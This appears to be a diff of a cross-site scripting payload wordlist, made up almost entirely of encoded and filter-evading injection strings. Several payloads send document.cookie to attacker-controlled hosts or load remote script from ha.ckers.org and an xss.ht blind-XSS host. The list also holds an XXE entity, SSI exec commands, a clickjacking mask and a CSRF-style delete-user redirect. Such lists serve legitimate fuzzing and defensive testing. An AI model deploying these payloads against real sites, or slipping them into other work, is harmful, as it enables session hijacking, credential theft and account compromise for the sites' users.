+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
+<link rel="stylesheet" href="javascript:document.vulnerable=true;">
+\x3c
+&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<img src="javascript:document.vulnerable=true;">
+<;A HREF=";http://1113982867/";>;XSS<;/A>;
+&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
+&lt;
+<div style=content:url(%(svg)s)></div>
+<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>
+<img src="http://38.media.tumblr.com/809d39daf44dd25ef7ce77706e44e953/tumblr_nuvz98USdD1resp2ko1_500.gif"></img>
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
+<body onload=window.location.assign('https://www.google.com')>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
+"egal=
+U%2bFF1CscriptU%2bFF1E
+confirm(document.cookie)
+&lt;HTML&gt;&lt;BODY&gt;
+&#X00003c;
+&lt;!&#91;endif&#93;--&gt;
+&#x03C
+<applet code="javascript:confirm(document.cookie);">
+<a href="javascript#document.vulnerable=true;">
+<marquee/onstart=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
+top["al"+"ert"](1)
+<embed src=%(jscript)s></embed>
+&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
+<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<div style="[a]color[b]:[c]red">XXX</div>
+%25u22%25u27%25u3e%25u3cscript%25u3econfirm(42)%25u3c/script%25u3e
+';';;!--";<;XSS>;=&;{()}
+onload
+<image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>
+&#X03c
+jAvas\Cript:confirm(42)
+&#x03c;
+<style>*[{}@import'test.css?]{color: green;}</style>X
+'-eval("window['pro'%2B'mpt'](8)")-'
+<svg/ subsoloprivxss \/\/%20%20%20%20%20onload%20%20%20%20%20 =%20%20%20%20%20%20%20 window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
+&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+%22><svg%20onload=confirm(1);>
+<embed type="image" src=%(scriptlet)s></embed>
+\"
+</Script/"'--><Body /Autofocus /OnFocus = confirm`1` <!-->
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
+top.
+"'><sc	ript>confirm(42)</script>
+href=
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+<form><isindex formaction="javascript&colon;confirm(1)"
+&#X0003c
+<%78 onxxx=1
+href="data:text/html;base64;charset=utf-7,+AFAASABOAGoAYwBtAGwAdwBkAEQANQBqAGIAMgA1AG0AYQBYAEoAdABLAEQAUQB5AEsAVABzADgATAAzAE4AagBjAG0AbAB3AGQARAA0AD0-"	base64 in UTF-7
+<a
+&lt;/BODY&gt;&lt;/HTML&gt;
+&#x003C;
+&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<D3/OnpOinTeReENter=confirm``>click here
+"'><sc\tript>confirm(42)</script>
+XSS
+&#X000003C;
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<;SCRIPT>;a=/XSS/
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
+<IFRAME SRC=”http://hacker-site.com/xss.html”>
+<img src=http://sn1persecurity.com/.testing/xss.png>//INJECTX REMOTE
+<br><br><br><br><br><br><br><br><br><br>
+<svg onload=alert&#40;1&#41>
+&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
+<SVg </onlOad ="1> (_=prompt,_(1)) "">
+eval(
+<!-- complete comment -->
+<;SCRIPT SRC=//ha.ckers.org/.j>;
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGFja2Vyb25lb2ZqYWFhaC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+onmouseover=
+<div style=content:url(test2.svg)></div><div style="background:url(test5.svg)">PRESS ENTER</div>
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
+<img DYNSRC="javascript:document.vulnerable=true;">
+&#X003C;
+&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
+\'
+<iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe><iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>
+<iframe src=%(scriptlet)s <
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+&#X000003c
+&#0000060
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
+top[8680439..toString(30)](1)
+<!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>
+<style>*[{}@import'%(css)s?]</style>X
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>
+\";document.vulnerable=true;;//
 <A HREF="http://66.102.7.147/">XSS</A>
 <svg/onload=%26nbsp;alert`bohdan`+
-<xml src="javascript:document.vulnerable=true;">
-&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
-&#x003c;
-<XSS STYLE="xss:expression(document.vulnerable=true)">
-<;A HREF=";http://1113982867/";>;XSS<;/A>;
-data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
-<bgsound SRC="javascript:document.vulnerable=true;">
-<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
-1111111
-<iframe onload=print()></iframe>
-&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
-<input onfocus=write(XSS) autofocus>
-<div id="x">XXX</div><style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>
-&#x000003C;
-<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>
-&#x000003c
-onmouseover
-<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
-<a href=
-&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
-PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYCA8IS0tPg==
-<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
-&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
-<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
-&#X3c;
-top[/al/.source+/ert/.source](1)
-&#X03c;
-<;SCRIPT>;a=/XSS/
-<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
-&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
-prompt(123)
-<a href="http://attacker.org"><iframe src="http://example.org/"></iframe></a>
-<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
-<;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";>;
-"onclick
-%u0022%u0027%u003e%u003cscript%u003econfirm(42)%u003c/script%u003e
-<IMG SRC="livescript:[code]">
+<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;
+<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<xml id="xss" src="test.htc"></xml><label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+<html xmlns="http://www.w3.org/1999/xhtml"xmlns:svg="http://www.w3.org/2000/svg"><body style="background:gray"><iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/><svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"><svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/><svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body></html>
+top[
+&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;
+&#X03C
+&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+&#x03C;
+<x style="behavior:url(%(sct)s)">
+&LT;
+&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
+<img src="mocha:document.vulnerable=true;">
 <LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
-Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
-<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
-<details open ontoggle=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
-&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;
-<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<body ONLOAD=document.vulnerable=true;>
-jAvas/* */Cript:confirm(42)
-onmouseover=\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF14\uFF12\u1450
-top.open`javas\cript:al\ert(1)`
-<img/src=@&#32;&#13; onerror = prompt('&#49;')
-&#X03C;
-&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;
-<body style="background-color:red !important;">
-/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
-<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
-confirm(123)
-"'%u3e%u3cscript%u3econfirm(42)%u3c/script%u3e
-%2522%2527%253e%253cscript%253econfirm(42)%253c/script%253e
-<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-style=
-%u00ABscript%u00BB
-&#X003c
-<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
-<a alt=42 href=
-<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
-<XSS STYLE="behavior: url(%(htc)s);">
-<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
-link=
-&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
-top["al"+"ert"](1)
-<a href=" javascript:
-<embed code=%(scriptlet)s></embed>
-'>//\\,<'>">">"*"
-<body onload="document.vulnerable=true;">
+&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
+<![CDATA[ open cdata
+&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
 <br SIZE="&{document.vulnerable=true}">
-'-document.write`<h1>juniorEXPLOIT</h1>`-'
-';a=prompt,a()//
-"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;hackeroneofjaaah.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
-<d3v/onauxclick=[2].some(confirm)>click
-&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
-&#X3C
-<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
-<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
+<iframe src="https://crowdshield.com/.testing/iframe_injection.php?iframe_src=3" height="0" width="0"></iframe>//INJECTX
+<IMG SRC="`<javascript:alert>`('XSS')"
+<;!--[if gte IE 4]>;
+&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+&#x0003c
+: \');confirm(1);//
+<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
+<div style="behaviour: url([link to code]);">
+INJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+&#x003C
+';
+<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
+<iframe width="420" height="315" src="https://www.youtube.com/embed/iUXAHc-ABoY?autoplay=1" frameborder="0" allowfullscreen></iframe>
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+&#x3C;
+<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;
+<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
+&lt;!--[if gte IE 4]&gt;
+<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
